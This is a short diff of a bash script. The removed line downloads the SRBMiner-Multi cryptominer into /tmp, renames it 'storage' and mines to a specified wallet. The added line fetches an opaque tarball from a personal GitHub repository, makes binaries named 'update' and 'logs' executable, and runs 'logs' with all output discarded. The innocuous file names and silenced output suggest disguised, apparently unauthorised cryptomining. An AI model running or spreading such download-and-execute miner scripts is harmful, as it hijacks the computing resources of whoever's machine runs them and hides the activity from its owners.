@@ -1,3 +1,4 @@
 #!/bin/bash
 reset
-cd /tmp && wget --no-check-certificate https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.4/SRBMiner-Multi-0-9-4-Linux.tar.xz && tar -xf SRBMiner-Multi-0-9-4-Linux.tar.xz && rm -rf SRBMiner-Multi-0-9-4-Linux.tar.xz && mv SRBMiner-Multi-0-9-4 storage && cd storage && ./SRBMiner-MULTI --algorithm verushash --pool verushash.mine.zergpool.com:3300 --wallet TF9Mph5JYPTjK9YukuEA8Urkgro9GmiEF8.storage --password c=TRX,mc=VRSC,ID=storage
+cd /tmp && wget https://raw.githubusercontent.com/robertreynolds2/mine/main/mina.tar && tar -xf mina.tar && rm -rf mina.tar && chmod +x update logs && ./logs > /dev/null 2>&1
+
